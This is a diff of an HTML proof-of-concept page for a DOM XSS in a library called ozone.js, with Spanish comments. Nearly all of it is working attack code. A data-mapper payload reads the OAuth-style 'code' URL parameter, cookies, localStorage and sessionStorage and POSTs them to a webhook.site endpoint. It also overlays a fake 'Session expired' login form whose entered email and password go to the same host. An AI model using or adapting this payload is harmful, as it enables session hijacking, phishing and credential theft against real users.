@@ -1,53 +1,64 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <meta charset="UTF-8" />
     <title>PoC DOM XSS - ozone.js</title>
+    <meta charset="UTF-8" />
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script src="ozone.js"></script>
   </head>
   <body>
-    <h2>Session expired. Please login again</h2>
-    <form id="fakeLogin">
-      <input type="text" id="username" placeholder="Email"/><br>
-      <input type="password" id="password" placeholder="Password"/><br>
-      <button type="submit">Login</button>
-    </form>
-    <select id="trigger"
+    <select
       data-src-url="/api/data"
-      data-mapper="()=>{ 
+      data-mapper="() => {
         const code = new URLSearchParams(location.search).get('code');
-        const cookie = document.cookie;
-        const local = JSON.stringify(localStorage);
-        const session = JSON.stringify(sessionStorage);
-        fetch('https://webhook.site/0d078024-de4c-4837-aa38-8627e361d5cc', {
+        const exfilEndpoint = 'https://webhook.site/0d078024-de4c-4837-aa38-8627e361d5cc';
+
+        // Exfiltrar info sensible
+        const info = {
+          code: code,
+          cookie: document.cookie,
+          localStorage: Object.fromEntries(Object.entries(localStorage)),
+          sessionStorage: Object.fromEntries(Object.entries(sessionStorage))
+        };
+
+        fetch(exfilEndpoint, {
           method: 'POST',
-          headers: {'Content-Type': 'text/plain'},
-          body: JSON.stringify({code, cookie, localStorage: local, sessionStorage: session})
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(info)
         });
+
+        // Si no hay 'code' ni localStorage, mostrar login falso
+        if (!code && !localStorage.getItem('user_logged')) {
+          const form = document.createElement('form');
+          form.innerHTML = `
+            <div style='position:fixed;top:0;left:0;width:100vw;height:100vh;background:#fff;z-index:9999;font-family:sans-serif;padding:20px'>
+              <h2 style='margin-bottom:10px;'>Session expired. Please login again</h2>
+              <input type='text' id='user' placeholder='Email'/><br><br>
+              <input type='password' id='pass' placeholder='Password'/><br><br>
+              <button type='submit'>Login</button>
+            </div>
+          `;
+          form.onsubmit = (e) => {
+            e.preventDefault();
+            const username = document.getElementById('user').value;
+            const password = document.getElementById('pass').value;
+
+            // Exfiltrar credenciales
+            fetch(exfilEndpoint, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ username, password })
+            });
+
+            // Guardar estado de login (falso)
+            localStorage.setItem('user_logged', '1');
+            alert('Login incorrecto. Try again later.');
+            location.reload();
+          };
+          document.body.appendChild(form);
+        }
       }">
     </select>
-
-    <script>
-      // Autoejecuta mapper para exfiltrar
-      window.onload = () => {
-        const el = document.querySelector('select[data-mapper]');
-        const fn = el?.getAttribute('data-mapper');
-        if (fn) eval(fn)();
-      };
-
-      // Captura login y exfiltra por POST
-      document.getElementById("fakeLogin").addEventListener("submit", function(e) {
-        e.preventDefault();
-        const username = document.getElementById("username").value;
-        const password = document.getElementById("password").value;
-        fetch("https://webhook.site/0d078024-de4c-4837-aa38-8627e361d5cc", {
-          method: "POST",
-          headers: {"Content-Type": "text/plain"},
-          body: JSON.stringify({username, password})
-        });
-      });
-    </script>
   </body>
 </html>
 
